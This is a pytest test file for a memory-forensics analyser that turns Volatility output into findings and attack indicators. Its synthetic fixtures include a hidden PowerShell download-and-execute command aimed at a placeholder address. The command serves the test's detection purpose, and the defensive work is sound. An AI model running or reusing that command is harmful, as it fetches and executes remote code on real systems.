import json

import pytest

from irsys import memory


def vol_results():
    pslist = [
        {"PID": 4, "PPID": 0, "ImageFileName": "System", "ExitTime": None},
        {"PID": 500, "PPID": 4, "ImageFileName": "smss.exe", "ExitTime": None},
        {"PID": 600, "PPID": 500, "ImageFileName": "wininit.exe", "ExitTime": None},
        {"PID": 700, "PPID": 600, "ImageFileName": "services.exe", "ExitTime": None},
        {"PID": 710, "PPID": 600, "ImageFileName": "lsass.exe", "ExitTime": None},
        {"PID": 800, "PPID": 700, "ImageFileName": "svchost.exe", "ExitTime": None},
        {"PID": 1200, "PPID": 1100, "ImageFileName": "explorer.exe", "ExitTime": None},
        {"PID": 2000, "PPID": 1200, "ImageFileName": "WINWORD.EXE", "ExitTime": None},
        {"PID": 2100, "PPID": 2000, "ImageFileName": "powershell.exe", "ExitTime": None},
        {"PID": 2200, "PPID": 1200, "ImageFileName": "svchost.exe", "ExitTime": None},   # 부모 이상
        {"PID": 2300, "PPID": 1200, "ImageFileName": "scvhost.exe", "ExitTime": None},   # 이름 위장
        {"PID": 2400, "PPID": 1200, "ImageFileName": "lsass.exe", "ExitTime": None},     # 중복 + 부모 이상
        {"PID": 2500, "PPID": 1200, "ImageFileName": "rundll32.exe", "ExitTime": None},
    ]
    cmdline = [
        {"PID": 2100, "Process": "powershell.exe", "Args": "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/s')"},
        {"PID": 2300, "Process": "scvhost.exe", "Args": r"C:\Users\Public\scvhost.exe -k netsvcs"},
    ]
    netscan = [
        {"PID": 2500, "Owner": "rundll32.exe", "Proto": "TCPv4", "LocalAddr": "10.0.0.15", "LocalPort": 50123,
         "ForeignAddr": "198.51.100.44", "ForeignPort": 443, "State": "ESTABLISHED"},
        {"PID": 800, "Owner": "svchost.exe", "Proto": "TCPv4", "LocalAddr": "10.0.0.15", "LocalPort": 50124,
         "ForeignAddr": "10.0.0.1", "ForeignPort": 445, "State": "ESTABLISHED"},
    ]
    malfind = [
        {"PID": 800, "Process": "svchost.exe", "Start VPN": "0x1f0000", "Protection": "PAGE_EXECUTE_READWRITE",
         "Hexdump": "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00"},
    ]
    return {"windows.pslist": pslist, "windows.cmdline": cmdline, "windows.netscan": netscan,
            "windows.malfind": malfind}


def test_memory_findings():
    r = memory.analyze(vol_results())
    types = {}
    for f in r["findings"]:
        types.setdefault(f["type"], []).append(f)
    assert types["duplicate_singleton"][0]["description"].startswith("lsass.exe")
    assert {f["pid"] for f in types["unexpected_parent"]} == {2200, 2400}
    assert types["name_masquerade"][0]["pid"] == 2300
    assert types["office_spawns_shell"][0]["pid"] == 2100
    assert types["suspicious_path"][0]["pid"] == 2300
    assert any(f["pid"] == 2100 for f in types["suspicious_cmdline"])
    assert types["unusual_network_process"][0]["pid"] == 2500
    assert types["injected_code"][0]["severity"] == "high"
    assert r["external_connections"] == [{"pid": 2500, "owner": "rundll32.exe", "proto": "TCPv4",
                                         "local": "10.0.0.15:50123", "remote": "198.51.100.44:443",
                                         "state": "ESTABLISHED"}]
    assert {"198.51.100.44", "203.0.113.9"} <= set(r["iocs"]["ipv4"])
    assert {"T1036.005", "T1204.002", "T1055", "T1071"} <= set(r["attack_techniques"])


def test_load_dir(tmp_path):
    for k, v in vol_results().items():
        (tmp_path / f"{k}.json").write_text(json.dumps(v))
    assert memory.analyze(memory.load_dir(tmp_path))["processes"] == 13
    with pytest.raises(ValueError):
        memory.load_dir(tmp_path / "empty")


def test_run_without_volatility(monkeypatch, tmp_path):
    monkeypatch.delenv("IRSYS_VOL", raising=False)
    monkeypatch.setattr(memory.shutil, "which", lambda _: None)
    with pytest.raises(RuntimeError):
        memory.run(tmp_path / "mem.raw", tmp_path / "out")


def test_masquerade_ignores_legit_lookalikes():
    assert memory._osa_distance("scvhost.exe", "svchost.exe") == 1
    rows = [{"PID": i, "PPID": 1, "ImageFileName": n, "ExitTime": None}
            for i, n in enumerate(["sihost.exe", "dashost.exe", "lsaiso.exe", "ctfmon.exe"], 10)]
    r = memory.analyze({"windows.pslist": rows})
    assert not [f for f in r["findings"] if f["type"] == "name_masquerade"]
